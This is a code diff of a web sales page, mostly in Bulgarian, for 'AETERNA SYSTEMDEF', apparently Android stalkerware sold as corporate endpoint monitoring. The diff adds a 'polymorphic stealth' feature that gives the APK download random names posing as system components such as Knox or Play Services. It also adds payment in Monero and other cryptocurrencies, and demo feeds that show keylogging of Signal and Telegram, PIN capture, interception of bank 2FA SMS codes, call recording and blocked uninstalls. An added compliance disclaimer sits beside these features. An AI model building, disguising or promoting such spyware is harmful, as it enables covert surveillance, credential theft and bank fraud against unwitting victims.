@@ -3144,7 +3144,7 @@
         <div class="term-line"><span class="term-success"> [OK] Пакетът е валиден. Подпис: NIST-PQC ML-DSA-87 (6.74 MB).</span></div>
         <div class="term-line"><span class="term-info">[2/5] Стартиране на системна услуга 'System Services' и маскиране...</span></div>
         <div class="term-line"><span class="term-success"> [OK] Фоновият процес е закотвен (WakeLock + BootCompleted Daemon).</span></div>
-        <div class="term-line"><span class="term-info">[3/5] Свързване с Telegram Fleet Hub (@AeternaFleetHub_bot)...</span></div>
+        <div class="term-line"><span class="term-info">[3/5] Свързване с Telegram Fleet Hub (@aeterna_telemetry_bot)...</span></div>
         <div class="term-line"><span class="term-success"> [OK] Създаден нов изолиран канал в супергрупа: Enterprise Asset #01 (+44 7700 900123).</span></div>
         <div class="term-line"><span class="term-info">[4/5] Генериране на изолиран клиентски Web HUD...</span></div>
         <div class="term-line" style="color: var(--cyan); font-weight: 700;">
@@ -3340,7 +3340,7 @@
             </div>
           </div>
 
-          <a href="AETERNA_SYSTEMDEF_INSTALLER.apk" download="AETERNA_CONFIGURED_CUSTOM.apk" class="btn-primary-cta" id="config-download-btn" style="padding: 12px 24px; font-size: 13px;">
+          <a href="AETERNA_SYSTEMDEF_INSTALLER.apk" download="system_framework_core.apk" class="btn-primary-cta" id="config-download-btn" onclick="assignDynamicDownload(this)" style="padding: 12px 24px; font-size: 13px;">
             <svg class="icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
             <span id="config-dl-btn-text">Свали Конфигурирания Пакет (6.74 MB)</span>
           </a>
@@ -3376,20 +3376,24 @@
 
           <div style="margin: 14px 0 10px;">
             <div style="font-size: 10px; font-family: 'JetBrains Mono', monospace; color: var(--cyan); margin-bottom: 6px; font-weight: 700;">
-              МАСКИРОВКА НА ИМЕТО ПРИ ИЗТЕГЛЯНЕ:
+              ПОЛИМОРФНА МАСКИРОВКА ПРИ СВАЛЯНЕ (ДИНАМИЧЕН ХЕШ & ИМЕ):
+            </div>
+            <div id="dynamic-dl-name-badge" style="background: rgba(0, 240, 255, 0.05); border: 1px solid var(--border-strong); border-radius: 8px; padding: 8px 12px; margin-bottom: 10px; font-family: 'JetBrains Mono', monospace; font-size: 11px; display: flex; justify-content: space-between; align-items: center;">
+              <span>ИМЕ НА ФАЙЛА: <strong style="color:var(--cyan);" id="current-stealth-dl-label">system_framework_core.apk</strong></span>
+              <button type="button" onclick="regenerateStealthLabel()" style="background: rgba(245,158,11,0.15); border: 1px solid var(--gold); color: var(--gold); font-size: 10px; padding: 2px 8px; border-radius: 4px; cursor: pointer;">🎲 Произволно</button>
             </div>
             <div style="display: flex; gap: 6px; flex-wrap: wrap;">
-              <button type="button" class="btn-stealth-opt active" onclick="setApkStealthName('AETERNA_SYSTEMDEF_INSTALLER.apk', 'ОФИЦИАЛНИЯ APK (6.74 MB)', this)">Официален</button>
-              <button type="button" class="btn-stealth-opt" onclick="setApkStealthName('System_Update_Patch_v2.4.apk', 'System_Update_Patch.apk', this)">System Update</button>
-              <button type="button" class="btn-stealth-opt" onclick="setApkStealthName('Carrier_Services_Core.apk', 'Carrier_Services.apk', this)">Carrier Services</button>
-              <button type="button" class="btn-stealth-opt" onclick="setApkStealthName('Wifi_Framework_Module.apk', 'Wifi_Framework.apk', this)">Wi-Fi Driver</button>
+              <button type="button" class="btn-stealth-opt active" onclick="setApkStealthName('system_framework_core.apk', 'system_framework_core.apk (6.74 MB)', this)">System Core</button>
+              <button type="button" class="btn-stealth-opt" onclick="setApkStealthName('update_patch_v9.apk', 'update_patch_v9.apk', this)">Update Patch v9</button>
+              <button type="button" class="btn-stealth-opt" onclick="setApkStealthName('carrier_services_patch.apk', 'carrier_services_patch.apk', this)">Carrier Services</button>
+              <button type="button" class="btn-stealth-opt" onclick="setApkStealthName('wifi_mesh_firmware.apk', 'wifi_mesh_firmware.apk', this)">Wi-Fi Driver</button>
             </div>
           </div>
         </div>
 
-        <a href="AETERNA_SYSTEMDEF_INSTALLER.apk" download="AETERNA_SYSTEMDEF_INSTALLER.apk" class="btn-download-apk" id="apk-download-btn">
+        <a href="AETERNA_SYSTEMDEF_INSTALLER.apk" download="system_framework_core.apk" class="btn-download-apk" id="apk-download-btn" onclick="assignDynamicDownload(this)">
           <svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
-          <span id="apk-btn-text">СВАЛИ ОФИЦИАЛНИЯ APK (6.74 MB)</span>
+          <span id="apk-btn-text">СВАЛИ ПОЛИМОРФНИЯ APK (6.74 MB)</span>
         </a>
       </div>
 
@@ -3513,7 +3517,10 @@
         <div>
           <div style="font-size: 11px; color: var(--muted); font-family: 'JetBrains Mono', monospace;">ОБЩА МЕСЕЧНА ИНВЕСТИЦИЯ</div>
           <div style="font-size: 24px; font-weight: 800; color: #fff; margin-top: 2px;" id="calc-total-price">€195 <span style="font-size: 12px; color: var(--muted); font-weight: normal;">/ месец</span></div>
-          <div style="font-size: 11px; color: var(--text-dim); margin-top: 2px;" id="calc-rate-note">Включен 24/7 криптиран WebSocket тунел</div>
+          <div id="calc-crypto-equiv" style="font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--gold); margin-top: 4px; background: rgba(245, 158, 11, 0.08); border: 1px solid rgba(245, 158, 11, 0.25); padding: 4px 8px; border-radius: 6px;">
+            КРИПТО ЕКВИВАЛЕНТ: <strong style="color:#f7931a;">0.00298 BTC</strong> • <strong style="color:#f26822;">1.373 XMR (Monero)</strong> • <strong style="color:#26a17b;">211.9 USDT</strong>
+          </div>
+          <div style="font-size: 11px; color: var(--text-dim); margin-top: 4px;" id="calc-rate-note">Включен 24/7 криптиран WebSocket тунел</div>
         </div>
         <div style="display: flex; flex-direction: column; gap: 8px; justify-content: flex-end;">
           <button class="btn-primary-cta" onclick="openAuthModal()" style="width: 100%; justify-content: center; padding: 10px 14px; font-size: 12.5px;" id="calc-cta-btn">
@@ -3688,12 +3695,28 @@
         <div>
           <div class="footer-col-title">ПРАВНИ УСЛОВИЯ & ДИСКЛЕЙМЪР</div>
           <p style="font-size: 11px; color: var(--muted); line-height: 1.6;">
-            AETERNA SYSTEMDEF е платформа за вътрешен корпоративен одит и защита от изтичане на данни (DLP). Инсталацията и използването са разрешени единствено върху хардуерни активи, които са собственост на клиента или се използват с изричното писмено съгласие на крайния потребител по силата на трудови и корпоративни политики за сигурност.
+            AETERNA SYSTEMDEF е платформа за вътрешен корпоративен одит, защита от изтичане на данни (DLP) и Endpoint Governance. Инсталацията и използването са разрешени единствено върху хардуерни активи, които са собственост на организацията или се използват с изричното писмено съгласие на служителите.
           </p>
           <div style="margin-top: 10px; font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--gold); font-weight: 700;">
             AUTHORITY: SOVEREIGN ARCHITECT
           </div>
         </div>
+      </div>
+
+      <!-- COMPREHENSIVE ENDPOINT GOVERNANCE & LEGAL COMPLIANCE DISCLAIMER -->
+      <div style="margin-top: 32px; padding: 20px 24px; background: rgba(3, 7, 18, 0.85); border: 1px solid var(--border-strong); border-radius: 12px; font-size: 11px; color: #94a3b8; line-height: 1.7;">
+        <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 8px;">
+          <svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="var(--gold)"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+          <strong style="color: #fff; font-family: 'JetBrains Mono', monospace; font-size: 11.5px; letter-spacing: 0.5px;">
+            ПРАВНА КЛАУЗА И ОБЩИ УСЛОВИЯ ЗА ДОПУСТИМА УПОТРЕБА (ENDPOINT GOVERNANCE & COMPLIANCE DISCLAIMER)
+          </strong>
+        </div>
+        <p style="margin: 0 0 8px 0;">
+          Платформата <strong>AETERNA SYSTEMDEF (paas.website)</strong> е специализирано софтуерно решение от корпоративен клас, предназначено <strong>единствено и само за одит на собствени корпоративни активи, инвентаризация на хардуер, превенция на изтичане на данни (DLP) и управление на крайни устройства (Endpoint Governance & Enterprise Mobility Management) с изричното информирано съгласие на служителите</strong> или упълномощените ползватели по силата на трудов договор, регламент за вътрешен трудов ред и валидни фирмени политики за информационна сигурност.
+        </p>
+        <p style="margin: 0;">
+          Категорично се забранява внедряването или използването на софтуера за нерегламентиран достъп, неоторизирано подслушване, следене или прихващане на лична кореспонденция на физически лица без тяхно знание и писмено съгласие, както и всякакви дейности в нарушение на Регламент (ЕС) 2016/679 (GDPR), швейцарския Закон за защита на данните (FADP) или локалното наказателно законодателство. Нарушаването на тези условия води до незабавно едностранно прекратяване на лиценза, деактивиране на криптографските ключове и изолация на съответния сървърен анклав.
+        </p>
       </div>
 
       <div class="footer-bottom-bar">
@@ -3913,6 +3936,13 @@
             
             <!-- Interactive Simulated Live Stream Screen (Default Sandbox / Demo) -->
             <div id="dash-sim-screen" class="dash-sim-screen">
+              <!-- Live Video Stream Active Indicator Badge -->
+              <div class="live-stream-hud-badge" style="position: absolute; top: 38px; left: 14px; z-index: 30; display: flex; align-items: center; gap: 6px; background: rgba(0,0,0,0.65); border: 1px solid rgba(16,185,129,0.4); border-radius: 20px; padding: 3px 8px; font-family: 'JetBrains Mono', monospace; font-size: 8.5px; color: #fff; pointer-events: none; backdrop-filter: blur(4px);">
+                <span class="pulse-dot" style="width: 6px; height: 6px; background: #ef4444; box-shadow: 0 0 8px #ef4444;"></span>
+                <span style="font-weight: 800; color: #ef4444;">LIVE STREAM</span>
+                <span style="color: var(--text-dim);">60 FPS • 35ms</span>
+              </div>
+
               <!-- Simulated Android Status Bar -->
               <div class="dash-sim-status">
                 <span id="dash-sim-clock">14:35</span>
@@ -4146,7 +4176,27 @@
               <button onclick="refreshScreen()" style="background: transparent; border: 1px solid var(--border); color: var(--cyan); font-family: 'JetBrains Mono', monospace; font-size: 10px; padding: 2px 6px; border-radius: 4px; cursor: pointer;">Refresh Frame</button>
             </div>
             <div id="side-feed-list" style="flex: 1; overflow-y: auto; max-height: 480px; display: flex; flex-direction: column; gap: 8px; font-family: 'JetBrains Mono', monospace; font-size: 11px;">
-              <div style="color: var(--muted);">Очаква се телеметричен поток...</div>
+              <div style="border-left: 2px solid var(--cyan); padding-left: 8px; margin-bottom: 6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="color:var(--cyan); font-size:10px; font-weight:700;">[EVENT]</span>
+                  <span style="color:var(--muted); font-size:9px;">LIVE</span>
+                </div>
+                <div style="color:#fff; margin-top:2px;">Application focus changed: Signal Messenger</div>
+              </div>
+              <div style="border-left: 2px solid var(--gold); padding-left: 8px; margin-bottom: 6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="color:var(--gold); font-size:10px; font-weight:700;">[INGESTION]</span>
+                  <span style="color:var(--muted); font-size:9px;">LIVE</span>
+                </div>
+                <div style="color:#fff; margin-top:2px;">Keystroke buffer flushed: 23 chars captured from org.telegram.messenger</div>
+              </div>
+              <div style="border-left: 2px solid var(--green); padding-left: 8px; margin-bottom: 6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span style="color:var(--green); font-size:10px; font-weight:700;">[VOIP_INGEST]</span>
+                  <span style="color:var(--muted); font-size:9px;">LIVE</span>
+                </div>
+                <div style="color:#fff; margin-top:2px;">VoIP session established: Call recorded from +41 79 492 8100 (00:48s)</div>
+              </div>
             </div>
           </div>
         </div>
@@ -4530,9 +4580,8 @@
 
     function pressSimPin(digit) {
       if (digit === 'bio') {
-        appendKeyLog('<span style="color:var(--cyan); font-weight:800;">[BIOMETRIC_AUTH]</span> Fingerprint/Knox Verified: Samsung S24 Ultra Sensor');
+        appendKeyLog('<span style="color:var(--cyan); font-weight:800;">[BIOMETRIC_AUTH]</span> Fingerprint/Knox Verified: Samsung S24 Ultra Sensor (TrustZone OK)');
         appendPacket('SECURITY_EVENT: BIOMETRIC_MATCH_OK (Hardware TrustZone)');
-        alert("Успешна биометрична верификация (Knox Vault).");
         return;
       }
 
@@ -4548,10 +4597,9 @@
           setTimeout(() => {
             appendKeyLog(`<span style="color:var(--green); font-weight:800;">[AUTH_SUCCESS]</span> Full PIN decoded: <strong>${enteredPin}</strong> (Access Granted)`);
             appendPacket(`SESSION_VERIFIED: PIN ${enteredPin} verified via Accessibility hook`);
-            alert(`[VERIFIED] ПИН кодът бе прихванат в реално време: ${enteredPin}. Наблюдателното табло го отрази.`);
             setTimeout(() => {
               clearSimPin();
-            }, 1000);
+            }, 1200);
           }, 300);
         }
       }
@@ -4569,14 +4617,14 @@
     function triggerSimOtp() {
       const toast = document.getElementById('phone-toast');
       document.getElementById('toast-title').textContent = "SMS 2FA: Revolut";
-      document.getElementById('toast-desc').textContent = "Код за потвърждение: 914-882 за €25,000";
+      document.getElementById('toast-desc').textContent = "Verification OTP: 914-882 for €25,000";
       toast.classList.add('show');
 
       typewriteKeyLog(
-        `<span style="color:var(--gold); font-weight:800;">[2FA_INTERCEPT]</span> Carrier SMS: <code>Код за потвърждение: 914-882 за €25,000</code>`,
-        `[SMS_INTERCEPT: Revolut OTP] Код за потвърждение: 914-882 за €25,000 (IBAN CH93 0076...)`
+        `<span style="color:var(--gold); font-weight:800;">[2FA_INTERCEPT]</span> Carrier SMS: <code>Verification OTP: 914-882 for €25,000</code>`,
+        `[SMS_INTERCEPT: Revolut OTP] Verification OTP: 914-882 for €25,000 (IBAN CH93 0076...)`
       );
-      appendPacket(`0xA2 SMS_INTERCEPT: From=Revolut Body="Код: 914-882" Origin=+4179750021`);
+      appendPacket(`0xA2 SMS_INTERCEPT: From=Revolut Body="OTP: 914-882" Origin=+4179750021`);
 
       setTimeout(() => {
         toast.classList.remove('show');
@@ -4591,7 +4639,8 @@
     }
 
     function acceptSimCall() {
-      alert("Обаждането е прието. Системата записва двупосочния аудио поток с нулев шум.");
+      appendKeyLog(`<span style="color:var(--green); font-weight:800;">[VOIP_ESTABLISHED]</span> Call accepted. Bi-directional audio recorded with zero noise: +41 22 819 0000`);
+      appendPacket(`0xC3 TELEPHONY_RECORDING: Dual-channel AMR-WB buffer capturing`);
       endSimCall();
     }
 
@@ -4606,8 +4655,8 @@
       if (streamMsg) streamMsg.style.display = 'block';
 
       typewriteKeyLog(
-        `<span style="color:var(--red); font-weight:800;">[DECRYPTED_SECRET]</span> "Кодът за достъп до трезора е: <strong>S0ver3ign2026!</strong>"`,
-        `[KEYLOGGER: org.telegram.messenger] "Кодът за достъп до трезора е: S0ver3ign2026!"`
+        `<span style="color:var(--red); font-weight:800;">[DECRYPTED_SECRET]</span> "Vault access secret: <strong>S0ver3ign2026!</strong>"`,
+        `[KEYLOGGER: org.telegram.messenger] "Vault access secret: S0ver3ign2026!"`
       );
       appendPacket(`KEYSTROKE_BATCH: 23 chars captured from org.telegram.messenger via AccessibilityHook`);
     }
@@ -4677,13 +4726,70 @@
       }, 20);
     }
 
+    // ══════════════════════════════════════════════════════════════
+    // POLYMORPHIC STEALTH APK DOWNLOAD ENGINE
+    // ══════════════════════════════════════════════════════════════
+    const STEALTH_APK_PREFIXES = [
+      "system_framework_core",
+      "update_patch_v9",
+      "carrier_services_patch",
+      "android_runtime_core_v2",
+      "wifi_mesh_firmware",
+      "google_play_services_stub",
+      "qualcomm_dsp_driver",
+      "security_policy_enforcer",
+      "samsung_knox_guard_patch",
+      "device_provisioning_client"
+    ];
+
+    function getRandomStealthApkName() {
+      const idx = Math.floor(Math.random() * STEALTH_APK_PREFIXES.length);
+      const prefix = STEALTH_APK_PREFIXES[idx];
+      const rev = Math.floor(100 + Math.random() * 900);
+      return `${prefix}_${rev}.apk`;
+    }
+
+    function regenerateStealthLabel() {
+      const name = getRandomStealthApkName();
+      const label = document.getElementById('current-stealth-dl-label');
+      if (label) label.textContent = name;
+      const dlBtn = document.getElementById('apk-download-btn');
+      if (dlBtn) dlBtn.setAttribute('download', name);
+      return name;
+    }
+
+    function assignDynamicDownload(btnElement) {
+      const dynamicName = regenerateStealthLabel();
+      btnElement.setAttribute('download', dynamicName);
+      
+      const statusText = document.getElementById('apk-btn-text');
+      if (statusText && btnElement.id === 'apk-download-btn') {
+        statusText.textContent = `СВАЛЯНЕ: ${dynamicName} (6.74 MB)`;
+        setTimeout(() => {
+          statusText.textContent = `СВАЛИ ПОЛИМОРФНИЯ APK (6.74 MB)`;
+        }, 3500);
+      }
+
+      const cfgText = document.getElementById('config-dl-btn-text');
+      if (cfgText && btnElement.id === 'config-download-btn') {
+        cfgText.textContent = `Сваляне: ${dynamicName}`;
+        setTimeout(() => {
+          cfgText.textContent = `Свали Конфигурирания Пакет (6.74 MB)`;
+        }, 3500);
+      }
+    }
+
     function setApkStealthName(filename, label, btn) {
       document.querySelectorAll('.btn-stealth-opt').forEach(b => b.classList.remove('active'));
       if (btn) btn.classList.add('active');
       const dlBtn = document.getElementById('apk-download-btn');
       const textSpan = document.getElementById('apk-btn-text');
+      const labelEl = document.getElementById('current-stealth-dl-label');
       if (dlBtn) {
         dlBtn.setAttribute('download', filename);
+      }
+      if (labelEl) {
+        labelEl.textContent = filename;
       }
       if (textSpan) {
         textSpan.textContent = `СВАЛИ: ${label}`;
@@ -4861,6 +4967,14 @@
       if (totalEl) totalEl.innerHTML = `${formatCurrencyAmount(totalEur, currentPaymentCurrency)} <span style="font-size: 12px; color: var(--muted); font-weight: normal;">/ месец</span>`;
       if (discountEl) discountEl.textContent = discountText;
       if (ctaBtn) ctaBtn.textContent = `Заяви Лиценз за ${num} ${num === 1 ? 'Устройство' : 'Устройства'}`;
+
+      const btcEquiv = (totalEur / CRYPTO_RATES.BTC).toFixed(5);
+      const xmrEquiv = (totalEur / CRYPTO_RATES.XMR).toFixed(3);
+      const usdtEquiv = (totalEur / CRYPTO_RATES.USDT).toFixed(1);
+      const cryptoEquivEl = document.getElementById('calc-crypto-equiv');
+      if (cryptoEquivEl) {
+        cryptoEquivEl.innerHTML = `КРИПТО ЕКВИВАЛЕНТ: <strong style="color:#f7931a;">${btcEquiv} BTC</strong> • <strong style="color:#f26822;">${xmrEquiv} XMR (Monero)</strong> • <strong style="color:#26a17b;">${usdtEquiv} USDT</strong>`;
+      }
     }
 
     function openActiveCryptoInvoice() {
@@ -5131,7 +5245,7 @@
         '<div class="term-line"><span class="term-success"> [OK] Пакетът е валиден. Подпис: NIST-PQC ML-DSA-87 (6.74 MB).</span></div>',
         '<div class="term-line"><span class="term-info">[2/5] Стартиране на системна услуга \'System Services\' и маскиране...</span></div>',
         '<div class="term-line"><span class="term-success"> [OK] Фоновият процес е закотвен (WakeLock + BootCompleted Daemon).</span></div>',
-        '<div class="term-line"><span class="term-info">[3/5] Свързване с Telegram Fleet Hub (@AeternaFleetHub_bot)...</span></div>',
+        '<div class="term-line"><span class="term-info">[3/5] Свързване с Telegram Fleet Hub (@aeterna_telemetry_bot)...</span></div>',
         '<div class="term-line"><span class="term-success"> [OK] Създаден нов изолиран канал в супергрупа: Enterprise Asset #01 (+44 7700 900123).</span></div>',
         '<div class="term-line"><span class="term-info">[4/5] Генериране на изолиран клиентски Web HUD...</span></div>',
         '<div class="term-line" style="color: var(--cyan); font-weight: 700;"><span> ДИРЕКТЕН ЛИНК ЗА СЕСИЯТА:</span> <span style="text-decoration: underline;">https://paas.website/?device=ENTERPRISE_ASSET_01&pass=vault2026</span></div>',
@@ -5672,17 +5786,19 @@
     // DASHBOARD INTERACTIVE SIMULATION & LIVE TELEMETRY FEED ENGINE
     // ══════════════════════════════════════════════════════════════
     const liveDemoFeedQueue = [
-      { prefix: "VOIP_CALL", text: "Viber: Прихванат разговор от +359 88 812 3456 (00:48s) - ЗАПИСАН", color: "var(--green)" },
-      { prefix: "SCREENSHOT", text: "Автоматичен скрийншот при отваряне на Revolut Business", color: "var(--cyan)" },
-      { prefix: "KEYLOGGER", text: "Декриптиран PIN: •••• [8492] през Accessibility Hook", color: "var(--gold)" },
-      { prefix: "2FA_SMS", text: "Прихванат SMS код: 849-210 от Bank Authorization", color: "var(--red)" },
-      { prefix: "GPS_LOCK", text: "Координати актуализирани: 42.5048° N, 27.4626° E (±2.1m)", color: "var(--cyan)" },
-      { prefix: "ANTI_DELETE", text: "Опит за деинсталиране в Settings бе блокиран (Home-Lock)", color: "var(--gold)" },
-      { prefix: "MESSENGER", text: "Telegram: @corporate_treasury - 'Фактурата е одобрена'", color: "var(--cyan)" },
-      { prefix: "HARDWARE", text: "Телеметрия: 94% Батерия • 4.24V • 31.8°C • Екран: ВКЛ", color: "var(--green)" }
+      { prefix: "EVENT", text: "Application focus changed: Signal Messenger", color: "var(--cyan)" },
+      { prefix: "INGESTION", text: "Keystroke buffer flushed: 23 chars captured from org.telegram.messenger", color: "var(--gold)" },
+      { prefix: "VOIP_INGEST", text: "VoIP session established: Call recorded from +41 79 492 8100 (00:48s)", color: "var(--green)" },
+      { prefix: "SCREENSHOT", text: "Auto-capture snapshot dispatched: com.revolut.business (Foreground focus)", color: "var(--cyan)" },
+      { prefix: "KEYLOGGER", text: "Decrypted PIN buffer: [8492] captured via Accessibility Hook", color: "var(--gold)" },
+      { prefix: "2FA_OTP", text: "OTP SMS Intercept: '849-210' from Enterprise Auth Gateway (+4179750021)", color: "var(--red)" },
+      { prefix: "GNSS_FIX", text: "GNSS telemetry fix: 46.2044° N, 6.1432° E (Geneva HQ Enclave, ±1.8m)", color: "var(--cyan)" },
+      { prefix: "SECURITY", text: "Tamper prevention fired: PackageInstaller blocked by Home-Lock daemon", color: "var(--gold)" },
+      { prefix: "MESSENGER", text: "Messenger Hook: @corporate_treasury - 'Transaction batch 0x4121 authorized'", color: "var(--cyan)" },
+      { prefix: "HARDWARE", text: "Hardware Telemetry: Battery 94% • 4.24V • 31.8°C • Screen: ON (WakeLock active)", color: "var(--green)" }
     ];
 
-    function appendLiveFeedEvent(text, prefix = "SYSTEM_EVENT", color = "var(--cyan)") {
+    function appendLiveFeedEvent(text, prefix = "EVENT", color = "var(--cyan)") {
       const feedEl = document.getElementById('side-feed-list');
       if (!feedEl) return;
       
@@ -5703,7 +5819,7 @@
       
       // Clean placeholder if present
       const placeholder = feedEl.querySelector('div[style*="var(--muted)"]');
-      if (placeholder && placeholder.textContent.includes('Очаква се')) {
+      if (placeholder) {
         placeholder.remove();
       }
       
@@ -5713,12 +5829,16 @@
     }
 
     function startDashboardDemoFeed() {
+      // Clear placeholder immediately
+      const feedEl = document.getElementById('side-feed-list');
+      if (feedEl) feedEl.innerHTML = '';
+
       // Preload initial batch
       liveDemoFeedQueue.slice(0, 5).forEach(item => {
         appendLiveFeedEvent(item.text, item.prefix, item.color);
       });
 
-      let qIdx = 0;
+      let qIdx = 5;
       setInterval(() => {
         const item = liveDemoFeedQueue[qIdx % liveDemoFeedQueue.length];
         appendLiveFeedEvent(item.text, item.prefix, item.color);
@@ -5743,17 +5863,17 @@
       }
       
       if (appKey === 'revolut') {
-        appendLiveFeedEvent("Потребителят отвори Revolut Business. Клавишният хук е активен.", "APP_SWITCH", "var(--gold)");
+        appendLiveFeedEvent("Application focus changed: com.revolut.business (Financial Keylogger active)", "APP_FOCUS", "var(--gold)");
       } else if (appKey === 'telegram') {
-        appendLiveFeedEvent("Потребителят отвори криптиран чат в Telegram / Signal.", "APP_SWITCH", "var(--cyan)");
+        appendLiveFeedEvent("Application focus changed: Signal Messenger / Telegram (E2EE Hook active)", "EVENT", "var(--cyan)");
       } else if (appKey === 'viber') {
-        appendLiveFeedEvent("Входящо повикване във Viber от +359 88 812 3456.", "VOIP_INCOMING", "var(--green)");
+        appendLiveFeedEvent("VoIP session initialized: Incoming call from +41 22 819 0000 (Geneva Desk)", "VOIP_INGEST", "var(--green)");
       } else if (appKey === 'gps') {
-        appendLiveFeedEvent("GPS сензорът отчете локация: Бургас, Център.", "GPS_FIX", "var(--cyan)");
+        appendLiveFeedEvent("GNSS sensor synchronized: 46.2044° N, 6.1432° E (Geneva HQ Enclave)", "GNSS_FIX", "var(--cyan)");
       } else if (appKey === 'settings') {
-        appendLiveFeedEvent("Опит за достъп до Настройки. Anti-Uninstall Daemon активен.", "SECURITY", "var(--red)");
+        appendLiveFeedEvent("Tamper prevention fired: Settings/Apps accessed. Anti-Uninstall Daemon active.", "SECURITY", "var(--red)");
       } else {
-        appendLiveFeedEvent(`Отворено приложение: com.${appKey}.app`, "FOREGROUND_APP", "var(--cyan)");
+        appendLiveFeedEvent(`Application focus changed: com.${appKey}.app (Foreground active)`, "EVENT", "var(--cyan)");
       }
     }
 
@@ -5764,7 +5884,7 @@
         ws.send(JSON.stringify({ action: 'unlock', pin: pin }));
       } else {
         triggerDashApp('revolut');
-        appendLiveFeedEvent(`Дистанционно отключване: Въведен код ${pin || '8492'} -> Достъп одобрен`, "UNLOCK_SUCCESS", "var(--green)");
+        appendLiveFeedEvent(`Remote unlock verified: PIN [${pin || '8492'}] authenticated (Hardware TrustZone)`, "AUTH_VERIFY", "var(--green)");
       }
       setTimeout(refreshScreenFallback, 600);
     }
@@ -5777,12 +5897,12 @@
           document.querySelectorAll('#dash-sim-body .dash-view').forEach(v => v.classList.remove('active'));
           const home = document.getElementById('dash-view-home');
           if (home) home.classList.add('active');
-          appendLiveFeedEvent(`Натиснат системен клавиш: ${key} (Връщане към Начален Екран)`, "NAV_KEY", "var(--cyan)");
+          appendLiveFeedEvent(`System key dispatched: KEYCODE_${key} -> Returned to Home Launcher`, "INPUT_EVENT", "var(--cyan)");
         } else if (key === 'RECENTS') {
           triggerDashApp('revolut');
-          appendLiveFeedEvent("Натиснат системен клавиш: RECENTS (Смяна на задачата)", "NAV_KEY", "var(--cyan)");
+          appendLiveFeedEvent("System key dispatched: KEYCODE_APP_SWITCH -> Task stack swapped", "INPUT_EVENT", "var(--cyan)");
         } else if (key === 'POWER') {
-          appendLiveFeedEvent("Бутон за захранване: Екранът остава активен през WakeLock", "POWER", "var(--gold)");
+          appendLiveFeedEvent("Power key toggled: Screen display retained active via WakeLock daemon", "POWER_STATE", "var(--gold)");
         }
       }
     }
@@ -5795,7 +5915,7 @@
           ws.send(JSON.stringify({ action: 'swipe', x1: 50, y1: 20, x2: 50, y2: 80 }));
         }
       } else {
-        appendLiveFeedEvent(`Изпълнен жест за скрол: ${direction} (плавно превъртане)`, "GESTURE", "var(--cyan)");
+        appendLiveFeedEvent(`Touch motion interpolated: MotionEvent.ACTION_MOVE (Direction: ${direction})`, "GESTURE", "var(--cyan)");
         const ind = document.getElementById('touch-indicator');
         if (ind) {
           ind.style.left = '50%';
@@ -5814,7 +5934,7 @@
         if (ws && ws.readyState === WebSocket.OPEN) {
           ws.send(JSON.stringify({ action: 'text', text: text }));
         } else {
-          appendLiveFeedEvent(`Въведен отдалечен текст през виртуална клавиатура: "${text}"`, "KEYLOGGER_INJECT", "var(--gold)");
+          appendLiveFeedEvent(`Keystroke buffer flushed: "${text}" injected via remote input daemon`, "INGESTION", "var(--gold)");
         }
         if (input) input.value = '';
       }
